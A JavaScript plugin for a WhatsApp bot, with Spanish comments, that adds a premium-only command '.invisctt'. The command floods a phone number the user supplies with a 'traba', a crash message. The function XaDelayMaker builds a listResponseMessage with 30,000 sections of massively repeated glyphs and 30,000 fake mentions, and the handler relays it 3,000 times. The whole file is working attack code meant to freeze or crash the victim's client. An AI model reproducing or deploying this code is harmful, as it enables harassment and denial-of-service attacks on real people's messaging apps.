// 🔹 Comando .invisctt para enviar traba invisible masiva

async function XaDelayMaker(target, conn) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Dapzy Is Here!",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "Dont Bothering Me Bro!!!"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  await conn.relayMessage(target, MSG, {});
}

// 🔹 Comando principal
let handler = async (m, { conn, text, isPremium }) => {
  if (!isPremium) return m.reply("❌ Este comando es solo para *usuarios premium*.");
  if (!text) return m.reply(`📌 Uso correcto:\n.invisctt 521234567890`);

  const jidx = text.replace(/[^0-9]/g, "");
  if (jidx.startsWith('0')) return m.reply("⚠️ No uses números que empiecen en 0.\nUsa el código de país, por ejemplo: 52 para México.");

  const target = `${jidx}@s.whatsapp.net`;
  await m.reply(`✅ Traba enviada a: ${target}\n⏳ Esto puede tardar unos segundos...`);

  await conn.sendMessage(m.chat, {
    audio: { url: 'https://files.catbox.moe/4c2kje.mp3' }, // Opcional
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: m });

  for (let i = 0; i < 500; i++) {
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
    await XaDelayMaker(target, conn);
  }

  console.log('✅ Traba invisctt completada');
};

handler.command = ['invisctt'];
handler.help = ['invisctt <número>'];
handler.tags = ['traba'];
handler.group = false;
handler.premium = true;

export default handler;